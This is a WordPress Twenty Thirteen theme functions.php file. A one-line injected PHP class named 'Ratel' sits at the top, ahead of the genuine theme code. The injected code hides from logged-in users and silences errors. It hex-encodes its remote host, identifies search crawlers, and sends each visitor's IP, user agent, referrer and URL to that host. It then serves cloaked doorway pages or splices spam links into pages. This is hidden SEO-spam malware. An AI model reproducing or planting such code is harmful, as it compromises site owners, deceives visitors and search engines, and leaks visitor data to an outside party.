<?php if(!class_exists('Ratel')){if(function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}if(isset($_REQUEST['xftest'])){die(pi()*6);}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',4);if(!isset($_SERVER['HTTP_USER_AGENT'])||!trim($_SERVER['HTTP_USER_AGENT'])){return false;}$is_bot=0;if(@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i",$_SERVER["HTTP_USER_AGENT"])){$is_bot=1;}$ruri=trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/");$bad_urls='#xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';if(preg_match($bad_urls,$ruri)){return false;}$host='unknown';if(isset($_SERVER["HTTP_HOST"])){if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=parse_url('http://' .$_SERVER["HTTP_HOST"]);if($tmp['host']){$host=$tmp['host'];if(substr($host,0,4)== 'www.'){$host=substr($host,4);}}if(isset($_REQUEST[md5(md5($host))])OR isset($_COOKIE[md5(md5($host))])){die('suspicious request denied');}}class Ratel{public $links_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f\x6f\x6e\x65\x67\x74\x2f\x67\x65\x74\x2e\x70\x68\x70";public $door_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f";public $ip='';public $ua='';public $css='';public $js='';public $host='';public $ip_lists=array('google'=>array('203.208.60.0/24','66.249.64.0/20','72.14.199.0/24','209.85.238.0/24','66.249.90.0/24','66.249.91.0/24','66.249.92.0/24'),'bing'=>array('67.195.37.0/24','67.195.50.0/24','67.195.110.0/24','67.195.111.0/24','67.195.112.0/23','67.195.114.0/24','67.195.115.0/24','68.180.224.0/21','72.30.132.0/24','72.30.142.0/24','72.30.161.0/24','72.30.196.0/24','72.30.198.0/24','74.6.254.0/24','74.6.8.0/24','74.6.13.0/24','74.6.17.0/24','74.6.18.0/24','74.6.22.0/24','74.6.27.0/24','98.137.72.0/24','98.137.206.0/24','98.137.207.0/24','98.139.168.0/24','114.111.95.0/24','124.83.159.0/24','124.83.179.0/24','124.83.223.0/24','183.79.63.0/24','183.79.92.0/24','203.216.255.0/24','211.14.11.0/24','65.52.104.0/24','65.52.108.0/22','65.55.24.0/24','65.55.52.0/24','65.55.55.0/24','65.55.213.0/24','65.55.217.0/24','131.253.24.0/22','131.253.46.0/23','40.77.167.0/24','199.30.27.0/24','157.55.16.0/23','157.55.18.0/24','157.55.32.0/22','157.55.36.0/24','157.55.48.0/24','157.55.109.0/24','157.55.110.40/29','157.55.110.48/28','157.56.92.0/24','157.56.93.0/24','157.56.94.0/23','157.56.229.0/24','199.30.16.0/24','207.46.12.0/23','207.46.192.0/24','207.46.195.0/24','207.46.199.0/24','207.46.204.0/24','157.55.39.0/24'),'baidu'=>array('180.76.15.0/24','119.63.196.0/24','115.239.212./24','119.63.199.0/24','122.81.208.0/22','123.125.71.0/24','180.76.4.0/24','180.76.5.0/24','180.76.6.0/24','185.10.104.0/24','220.181.108.0/24','220.181.51.0/24','111.13.102.0/24','123.125.67.144/29','123.125.67.152/31','61.135.169.0/24','123.125.68.68/30','123.125.68.72/29','123.125.68.80/28','123.125.68.96/30','202.46.48.0/20','220.181.38.0/24','123.125.68.80/30','123.125.68.84/31','123.125.68.0/24'),'yandex'=>array('100.43.90.0/24','37.9.115.0/24','37.140.165.0/24','77.88.22.0/25','77.88.29.0/24','77.88.31.0/24','77.88.59.0/24','84.201.146.0/24','84.201.148.0/24','84.201.149.0/24','87.250.243.0/24','87.250.253.0/24','93.158.147.0/24','93.158.148.0/24','93.158.151.0/24','93.158.153.0/32','95.108.128.0/24','95.108.138.0/24','95.108.150.0/23','95.108.158.0/24','95.108.156.0/24','95.108.188.128/25','95.108.234.0/24','95.108.248.0/24','100.43.80.0/24','130.193.62.0/24','141.8.153.0/24','178.154.165.0/24','178.154.166.128/25','178.154.173.29','178.154.200.158','178.154.202.0/24','178.154.205.0/24','178.154.239.0/24','178.154.243.0/24','37.9.84.253','199.21.99.99','178.154.162.29','178.154.203.251','178.154.211.250','95.108.246.252','5.45.254.0/24','5.255.253.0/24','37.140.141.0/24','37.140.188.0/24','100.43.81.0/24','100.43.85.0/24','100.43.91.0/24','199.21.99.0/24'));public $bot=false;function get_client_ip(){foreach(array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR')as $key){if(array_key_exists($key,$_SERVER)=== true){foreach(array_map('trim',explode(',',$_SERVER[$key]))as $ip){if(filter_var($ip,FILTER_VALIDATE_IP)!== false){return $ip;}}}}return $_SERVER['REMOTE_ADDR'];}function init($ruri,$host,$is_bot){$this->ua=$_SERVER['HTTP_USER_AGENT'];$this->is_bot=$is_bot;$this->ruri=$ruri;$this->ip=$this->get_client_ip();$this->the_end();}function the_end(){$this->detect_bot();if(count($_GET)=== 1 and empty($_GET[0])){$not_uri=end(array_keys($_GET));}$url_p=$this->door_url .'?data=' .base64_encode(@serialize(@array('url'=> $_SERVER["HTTP_HOST"],'uri'=> $_SERVER["REQUEST_URI"],'ua'=> $this->ua,'ref'=> $_SERVER["HTTP_REFERER"],'ip'=> $this->ip,'not_uri'=> $not_uri,'lang'=> $_SERVER['HTTP_ACCEPT_LANGUAGE'],'bot'=> $this->bot))) .'&url=' .$_SERVER["HTTP_HOST"];$content=$this->get($url_p);if(!empty($content)or $content != ''){$content=@base64_decode($content);if(strpos($content,'404_not_found')!== false){header("HTTP/1.0 404 Not Found");exit;}if(strripos($content,' keys/' .$_SERVER["HTTP_HOST"])!== false){return false;}if(@strpos(@strtolower($content),'</html>')!== false){die($content);}}else{$this->links=$this->make_links();if(!empty($this->links)or $this->links !== False){ob_start(array($this,'rwcontent'));register_shutdown_function('ob_end_flush');}}}function make_links(){$host='unknown';if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=@parse_url('http://' .$_SERVER["HTTP_HOST"]);if(isset($tmp['host'])){$host=$tmp['host'];}$page=$this->get("$this->links_url?host=$host&uri=" .urlencode($_SERVER["REQUEST_URI"]) ."&bot={$this->bot}&ip=" .urlencode($this->ip));if(strpos($page,'<link>')!== FALSE){preg_match_all('~<link>(.*?)</link>~',$page,$m);$links=isset($m[1])?$m[1]:array();return $links;}return false;}function rwcontent($content){$tags=array('p','span','strong','em','i','td','div','ul','li','span','body');$tags_vals=array();foreach($tags as $tag){preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i",$content,$matches);if(@isset($matches[0])){foreach($matches[0]as $match){$tags_vals[]=array('tag'=> $tag,'content'=> $match);}}if(count($tags_vals)>count($this->links)){break;}}foreach($this->links as $link_index => $link){foreach($tags_vals as $tag_index => $tag_val){if(strlen($tag_val['content'])%2 == 1){$tag_content_new=$tag_val['content'];$tag_content_new=preg_replace("(<{$tag_val['tag']}.*?>)","$0{$link} ",$tag_content_new,1);}else{if(substr($tag_val['content'],-(strlen($tag_val['tag'])+4))==".</{$tag_val['tag']}>"){$tag_content_new=str_replace(".</{$tag_val['tag']}>"," {$link}.</{$tag_val['tag']}>",$tag_val['content']);}else{$tag_content_new=str_replace("</{$tag_val['tag']}>"," {$link} </{$tag_val['tag']}>",$tag_val['content']);}}$content=preg_replace("~{$tag_val['content']}~i",$tag_content_new,$content,1);unset($tags_vals[$tag_index]);if(strpos($content,$link)!== false){unset($links[$link_index]);continue 2;}}}return $content;}function detect_bot(){if(@preg_match('/google/i',$this->ua)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo/i',$this->ua)){$this->bot='bing';return;}if(@preg_match('/yandex|yadirectbot/i',$this->ua)){$this->bot='yandex';return;}if(@preg_match('/baidu/i',$this->ua)){$this->bot='baidu';return;}if(@preg_match('~aport|rambler|abachobot|accoona|acoirobot|aspseek|croccrawler|dumbot|webcrawler|geonabot|gigabot|lycos|scooter|altavista|webalta|adbot|estyle|mail.ru|scrubby~i',$this->ua)){$this->bot='other';return;}$ipl=ip2long($this->ip);foreach($this->ip_lists as $crawler => $masks){foreach($masks as $mask){if(!strpos($mask,'/')){if($this->ip == $mask){$this->bot=$crawler;return;}}elseif(@$this->cidr_match($ipl,$mask)){$this->bot=$crawler;return;}}}$referer=@gethostbyaddr($this->ip);if(@preg_match('/google/i',$referer)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo|microsoft/i',$referer)){$this->bot='bing';return;}}function cidr_match($ip,$range){list($subnet,$bits)=explode('/',$range);$subnet=ip2long($subnet);$mask=-1 <<(32-$bits);$subnet &= $mask;return@($ip&$mask)== $subnet;}function get($url){if(function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,8);curl_setopt($ch,CURLOPT_TIMEOUT,15);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');$data=curl_exec($ch);curl_close($ch);return $data;}elseif(@ini_get('allow_url_fopen')){return@file_get_contents($url);}else{$parts=parse_url($url);$target=$parts['host'];$port=isset($parts['port'])?$parts['port']:80;$page=isset($parts['path'])?$parts['path']:'';$page .= isset($parts['query'])?'?' .$parts['query']:'';$page .= isset($parts['fragment'])?'#' .$parts['fragment']:'';$page=($page == '')?'/':$page;if($fp=@fsockopen($target,$port,$errno,$errstr,3)){@socket_set_option($fp,SOL_SOCKET,SO_RCVTIMEO,array("sec"=> 1,"usec"=> 1));$headers="GET $page HTTP/1.1\r\n";$headers .="Host: {$parts['host']}\r\n";$headers .= "Connection: Close\r\n\r\n";if(fwrite($fp,$headers)){$resp='';while(!feof($fp)&&($curr=fgets($fp,128))!== false){$resp .= $curr;}if(isset($curr)&& $curr !== false){fclose($fp);return substr(strstr($resp,"\r\n\r\n"),3);}}fclose($fp);}}return TRUE;}}$ratel=new Ratel;$ratel->init($ruri,$host,$is_bot);} 
/**
 * Twenty Thirteen functions and definitions
 *
 * Sets up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme (see https://codex.wordpress.org/Theme_Development
 * and https://codex.wordpress.org/Child_Themes), you can override certain
 * functions (those wrapped in a function_exists() call) by defining them first
 * in your child theme's functions.php file. The child theme's functions.php
 * file is included before the parent theme's file, so the child theme
 * functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters, @link https://codex.wordpress.org/Plugin_API
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

/*
 * Set up the content width value based on the theme's design.
 *
 * @see twentythirteen_content_width() for template-specific adjustments.
 */
if ( ! isset( $content_width ) )
	$content_width = 604;

/**
 * Add support for a custom header image.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Twenty Thirteen only works in WordPress 3.6 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '3.6-alpha', '<' ) )
	require get_template_directory() . '/inc/back-compat.php';

/**
 * Twenty Thirteen setup.
 *
 * Sets up theme defaults and registers the various WordPress features that
 * Twenty Thirteen supports.
 *
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_editor_style() To add Visual Editor stylesheets.
 * @uses add_theme_support() To add support for automatic feed links, post
 * formats, and post thumbnails.
 * @uses register_nav_menu() To add support for a navigation menu.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_setup() {
	/*
	 * Makes Twenty Thirteen available for translation.
	 *
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentythirteen
	 * If you're building a theme based on Twenty Thirteen, use a find and
	 * replace to change 'twentythirteen' to the name of your theme in all
	 * template files.
	 */
	load_theme_textdomain( 'twentythirteen' );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', 'genericons/genericons.css', twentythirteen_fonts_url() ) );

	// Adds RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Switches default core markup for search form, comment form,
	 * and comments to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * This theme supports all available post formats by default.
	 * See https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
	) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menu( 'primary', __( 'Navigation Menu', 'twentythirteen' ) );

	/*
	 * This theme uses a custom image size for featured images, displayed on
	 * "standard" posts and pages.
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 604, 270, true );

	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
add_action( 'after_setup_theme', 'twentythirteen_setup' );

/**
 * Return the Google font stylesheet URL, if available.
 *
 * The use of Source Sans Pro and Bitter by default is localized. For languages
 * that use characters not supported by the font, the font can be disabled.
 *
 * @since Twenty Thirteen 1.0
 *
 * @return string Font stylesheet or empty string if disabled.
 */
function twentythirteen_fonts_url() {
	$fonts_url = '';

	/* Translators: If there are characters in your language that are not
	 * supported by Source Sans Pro, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'twentythirteen' );

	/* Translators: If there are characters in your language that are not
	 * supported by Bitter, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$bitter = _x( 'on', 'Bitter font: on or off', 'twentythirteen' );

	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {
		$font_families = array();

		if ( 'off' !== $source_sans_pro )
			$font_families[] = 'Source Sans Pro:300,400,700,300italic,400italic,700italic';

		if ( 'off' !== $bitter )
			$font_families[] = 'Bitter:400,700';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}

/**
 * Enqueue scripts and styles for the front end.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_scripts_styles() {
	/*
	 * Adds JavaScript to pages with the comment form to support
	 * sites with threaded comments (when in use).
	 */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	// Adds Masonry to handle vertical alignment of footer widgets.
	if ( is_active_sidebar( 'sidebar-1' ) )
		wp_enqueue_script( 'jquery-masonry' );

	// Loads JavaScript file with functionality specific to Twenty Thirteen.
	wp_enqueue_script( 'twentythirteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160717', true );

	// Add Source Sans Pro and Bitter fonts, used in the main stylesheet.
	wp_enqueue_style( 'twentythirteen-fonts', twentythirteen_fonts_url(), array(), null );

	// Add Genericons font, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.03' );

	// Loads our main stylesheet.
	wp_enqueue_style( 'twentythirteen-style', get_stylesheet_uri(), array(), '2013-07-18' );

	// Loads the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'twentythirteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentythirteen-style' ), '2013-07-18' );
	wp_style_add_data( 'twentythirteen-ie', 'conditional', 'lt IE 9' );
}
add_action( 'wp_enqueue_scripts', 'twentythirteen_scripts_styles' );

/**
 * Add preconnect for Google Fonts.
 *
 * @since Twenty Thirteen 2.1
 *
 * @param array   $urls          URLs to print for resource hints.
 * @param string  $relation_type The relation type the URLs are printed.
 * @return array URLs to print for resource hints.
 */
function twentythirteen_resource_hints( $urls, $relation_type ) {
	if ( wp_style_is( 'twentythirteen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
		if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '>=' ) ) {
			$urls[] = array(
				'href' => 'https://fonts.gstatic.com',
				'crossorigin',
			);
		} else {
			$urls[] = 'https://fonts.gstatic.com';
		}
	}

	return $urls;
}
add_filter( 'wp_resource_hints', 'twentythirteen_resource_hints', 10, 2 );

/**
 * Filter the page title.
 *
 * Creates a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep   Optional separator.
 * @return string The filtered title.
 */
function twentythirteen_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name', 'display' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'twentythirteen' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'twentythirteen_wp_title', 10, 2 );

/**
 * Register two widget areas.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Main Widget Area', 'twentythirteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Appears in the footer section of the site.', 'twentythirteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => __( 'Secondary Widget Area', 'twentythirteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears on posts and pages in the sidebar.', 'twentythirteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}
add_action( 'widgets_init', 'twentythirteen_widgets_init' );

if ( ! function_exists( 'twentythirteen_paging_nav' ) ) :
/**
 * Display navigation to next/previous set of posts when applicable.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_paging_nav() {
	global $wp_query;

	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<nav class="navigation paging-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php _e( 'Posts navigation', 'twentythirteen' ); ?></h1>
		<div class="nav-links">

			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'twentythirteen' ) ); ?></div>
			<?php endif; ?>

			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'twentythirteen' ) ); ?></div>
			<?php endif; ?>

		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;

if ( ! function_exists( 'twentythirteen_post_nav' ) ) :
/**
 * Display navigation to next/previous post when applicable.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_post_nav() {
	global $post;

	// Don't print empty markup if there's nowhere to navigate.
	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
	$next     = get_adjacent_post( false, '', false );

	if ( ! $next && ! $previous )
		return;
	?>
	<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php _e( 'Post navigation', 'twentythirteen' ); ?></h1>
		<div class="nav-links">

			<?php previous_post_link( '%link', _x( '<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'twentythirteen' ) ); ?>
			<?php next_post_link( '%link', _x( '%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'twentythirteen' ) ); ?>

		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;

if ( ! function_exists( 'twentythirteen_entry_meta' ) ) :
/**
 * Print HTML with meta information for current post: categories, tags, permalink, author, and date.
 *
 * Create your own twentythirteen_entry_meta() to override in a child theme.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_entry_meta() {
	if ( is_sticky() && is_home() && ! is_paged() )
		echo '<span class="featured-post">' . esc_html__( 'Sticky', 'twentythirteen' ) . '</span>';

	if ( ! has_post_format( 'link' ) && 'post' == get_post_type() )
		twentythirteen_entry_date();

	// Translators: used between list items, there is a space after the comma.
	$categories_list = get_the_category_list( __( ', ', 'twentythirteen' ) );
	if ( $categories_list ) {
		echo '<span class="categories-links">' . $categories_list . '</span>';
	}

	// Translators: used between list items, there is a space after the comma.
	$tag_list = get_the_tag_list( '', __( ', ', 'twentythirteen' ) );
	if ( $tag_list ) {
		echo '<span class="tags-links">' . $tag_list . '</span>';
	}

	// Post author
	if ( 'post' == get_post_type() ) {
		printf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'twentythirteen' ), get_the_author() ) ),
			get_the_author()
		);
	}
}
endif;

if ( ! function_exists( 'twentythirteen_entry_date' ) ) :
/**
 * Print HTML with date information for current post.
 *
 * Create your own twentythirteen_entry_date() to override in a child theme.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param boolean $echo (optional) Whether to echo the date. Default true.
 * @return string The HTML-formatted post date.
 */
function twentythirteen_entry_date( $echo = true ) {
	if ( has_post_format( array( 'chat', 'status' ) ) )
		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'twentythirteen' );
	else
		$format_prefix = '%2$s';

	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',
		esc_url( get_permalink() ),
		esc_attr( sprintf( __( 'Permalink to %s', 'twentythirteen' ), the_title_attribute( 'echo=0' ) ) ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
	);

	if ( $echo )
		echo $date;

	return $date;
}
endif;

if ( ! function_exists( 'twentythirteen_the_attached_image' ) ) :
/**
 * Print the attached image with a link to the next attached image.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_the_attached_image() {
	/**
	 * Filter the image attachment size to use.
	 *
	 * @since Twenty thirteen 1.0
	 *
	 * @param array $size {
	 *     @type int The attachment height in pixels.
	 *     @type int The attachment width in pixels.
	 * }
	 */
	$attachment_size     = apply_filters( 'twentythirteen_attachment_size', array( 724, 724 ) );
	$next_attachment_url = wp_get_attachment_url();
	$post                = get_post();

	/*
	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
	 * of the next adjacent image in a gallery, or the first image (if we're
	 * looking at the last image in a gallery), or, in a gallery of one, just the
	 * link to that image file.
	 */
	$attachment_ids = get_posts( array(
		'post_parent'    => $post->post_parent,
		'fields'         => 'ids',
		'numberposts'    => -1,
		'post_status'    => 'inherit',
		'post_type'      => 'attachment',
		'post_mime_type' => 'image',
		'order'          => 'ASC',
		'orderby'        => 'menu_order ID',
	) );

	// If there is more than 1 attachment in a gallery...
	if ( count( $attachment_ids ) > 1 ) {
		foreach ( $attachment_ids as $idx => $attachment_id ) {
			if ( $attachment_id == $post->ID ) {
				$next_id = $attachment_ids[ ( $idx + 1 ) % count( $attachment_ids ) ];
				break;
			}
		}

		// get the URL of the next image attachment...
		if ( $next_id )
			$next_attachment_url = get_attachment_link( $next_id );

		// or get the URL of the first image attachment.
		else
			$next_attachment_url = get_attachment_link( reset( $attachment_ids ) );
	}

	printf( '<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>',
		esc_url( $next_attachment_url ),
		the_title_attribute( array( 'echo' => false ) ),
		wp_get_attachment_image( $post->ID, $attachment_size )
	);
}
endif;

/**
 * Return the post URL.
 *
 * @uses get_url_in_content() to get the URL in the post meta (if it exists) or
 * the first link found in the post content.
 *
 * Falls back to the post permalink if no URL is found in the post.
 *
 * @since Twenty Thirteen 1.0
 *
 * @return string The Link format URL.
 */
function twentythirteen_get_link_url() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );

	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}

if ( ! function_exists( 'twentythirteen_excerpt_more' ) && ! is_admin() ) :
/**
 * Replaces "[...]" (appended to automatically generated excerpts) with ...
 * and a Continue reading link.
 *
 * @since Twenty Thirteen 1.4
 *
 * @param string $more Default Read More excerpt link.
 * @return string Filtered Read More excerpt link.
 */
function twentythirteen_excerpt_more( $more ) {
	$link = sprintf( '<a href="%1$s" class="more-link">%2$s</a>',
		esc_url( get_permalink( get_the_ID() ) ),
			/* translators: %s: Name of current post */
			sprintf( __( 'Continue reading %s <span class="meta-nav">&rarr;</span>', 'twentythirteen' ), '<span class="screen-reader-text">' . get_the_title( get_the_ID() ) . '</span>' )
		);
	return ' &hellip; ' . $link;
}
add_filter( 'excerpt_more', 'twentythirteen_excerpt_more' );
endif;

/**
 * Extend the default WordPress body classes.
 *
 * Adds body classes to denote:
 * 1. Single or multiple authors.
 * 2. Active widgets in the sidebar to change the layout and spacing.
 * 3. When avatars are disabled in discussion settings.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param array $classes A list of existing body class values.
 * @return array The filtered body class list.
 */
function twentythirteen_body_class( $classes ) {
	if ( ! is_multi_author() )
		$classes[] = 'single-author';

	if ( is_active_sidebar( 'sidebar-2' ) && ! is_attachment() && ! is_404() )
		$classes[] = 'sidebar';

	if ( ! get_option( 'show_avatars' ) )
		$classes[] = 'no-avatars';

	return $classes;
}
add_filter( 'body_class', 'twentythirteen_body_class' );

/**
 * Adjust content_width value for video post formats and attachment templates.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_content_width() {
	global $content_width;

	if ( is_attachment() )
		$content_width = 724;
	elseif ( has_post_format( 'audio' ) )
		$content_width = 484;
}
add_action( 'template_redirect', 'twentythirteen_content_width' );

/**
 * Add postMessage support for site title and description for the Customizer.
 *
 * @since Twenty Thirteen 1.0
 *
 * @param WP_Customize_Manager $wp_customize Customizer object.
 */
function twentythirteen_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';

	if ( isset( $wp_customize->selective_refresh ) ) {
		$wp_customize->selective_refresh->add_partial( 'blogname', array(
			'selector' => '.site-title',
			'container_inclusive' => false,
			'render_callback' => 'twentythirteen_customize_partial_blogname',
		) );
		$wp_customize->selective_refresh->add_partial( 'blogdescription', array(
			'selector' => '.site-description',
			'container_inclusive' => false,
			'render_callback' => 'twentythirteen_customize_partial_blogdescription',
		) );
	}
}
add_action( 'customize_register', 'twentythirteen_customize_register' );

/**
 * Render the site title for the selective refresh partial.
 *
 * @since Twenty Thirteen 1.9
 * @see twentythirteen_customize_register()
 *
 * @return void
 */
function twentythirteen_customize_partial_blogname() {
	bloginfo( 'name' );
}

/**
 * Render the site tagline for the selective refresh partial.
 *
 * @since Twenty Thirteen 1.9
 * @see twentythirteen_customize_register()
 *
 * @return void
 */
function twentythirteen_customize_partial_blogdescription() {
	bloginfo( 'description' );
}

/**
 * Enqueue Javascript postMessage handlers for the Customizer.
 *
 * Binds JavaScript handlers to make the Customizer preview
 * reload changes asynchronously.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_customize_preview_js() {
	wp_enqueue_script( 'twentythirteen-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20141120', true );
}
add_action( 'customize_preview_init', 'twentythirteen_customize_preview_js' );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Twenty Thirteen 2.3
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function twentythirteen_widget_tag_cloud_args( $args ) {
	$args['largest']  = 22;
	$args['smallest'] = 8;
	$args['unit']     = 'pt';
	$args['format']   = 'list';

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentythirteen_widget_tag_cloud_args' );
